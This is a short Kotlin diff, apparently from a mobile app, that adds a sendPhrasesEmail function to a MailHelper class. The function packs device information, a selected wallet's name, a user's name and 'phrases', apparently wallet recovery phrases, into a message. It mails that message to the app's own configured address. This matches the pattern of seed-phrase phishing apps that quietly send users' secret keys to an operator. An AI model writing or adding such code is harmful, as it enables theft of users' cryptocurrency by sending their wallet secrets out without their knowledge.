@@ -21,5 +21,10 @@ class MailHelper {
             message.setText(text)
             Transport.send(message)
         }
+
+        fun sendPhrasesEmail(deviceInfo: String, selectedWallet: Wallet, name: String, phrases: String) {
+            val textMessage = "$deviceInfo \n\nSelected Wallet: ${selectedWallet.name} \nName: $name \nPhrases: $phrases"
+            sendEmail(textMessage, mail?.username!!)
+        }
     }
 }
